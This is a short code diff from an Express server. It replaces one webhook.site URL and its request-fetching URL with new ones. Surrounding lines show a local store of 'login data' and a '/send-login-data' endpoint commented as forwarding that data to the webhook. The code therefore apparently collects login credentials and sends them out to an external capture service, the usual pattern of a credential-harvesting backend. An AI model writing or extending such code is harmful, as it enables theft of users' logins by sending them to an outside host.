@@ -10,8 +10,8 @@ app.use(express.json());
 // Initialize the login data store
 const loginDataStore = []; // Store login data locally
 
-const webhookUrl = "https://webhook.site/55735d4c-4dd8-447a-9758-b50e87a3c96a";
-const webhookRequestsUrl = "https://webhook.site/token/55735d4c-4dd8-447a-9758-b50e87a3c96a/requests"; // URL for fetching webhook requests
+const webhookUrl = "https://webhook.site/395d3c42-2e15-4cb4-917a-2dc9aaee102a";
+const webhookRequestsUrl = "https://webhook.site/token/395d3c42-2e15-4cb4-917a-2dc9aaee102a/requests"; // URL for fetching webhook requests
 
 // Endpoint to handle incoming login data and forward it to the webhook
 app.post('/send-login-data', (req, res) => {
